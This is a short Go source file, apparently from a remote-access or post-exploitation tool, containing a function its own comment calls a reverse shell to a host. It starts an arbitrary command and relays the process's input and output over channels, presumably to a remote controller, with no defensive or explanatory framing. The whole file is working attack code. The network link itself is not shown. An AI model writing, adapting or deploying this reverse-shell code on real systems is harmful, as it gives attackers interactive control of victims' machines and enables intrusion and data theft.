package main

import (
	"log"
	"os"
	"os/exec"
)

const (
	// Read buffer
	readBufSize = 128
)

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

// ReverseShell - Execute a reverse shell to host
func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
	var cmd *exec.Cmd
	cmd = exec.Command(command)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	go func() {
		for {
			select {
			case incoming := <-recv:
				log.Printf("[*] shell stdin write: %v", incoming)
				stdin.Write(incoming)
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, readBufSize)
			stderr.Read(buf)
			log.Printf("[*] shell stderr read: %v", buf)
			send <- buf
		}
	}()

	cmd.Start()
	for {
		buf := make([]byte, readBufSize)
		stdout.Read(buf)
		log.Printf("[*] shell stdout read: %v", buf)
		send <- buf
	}
}
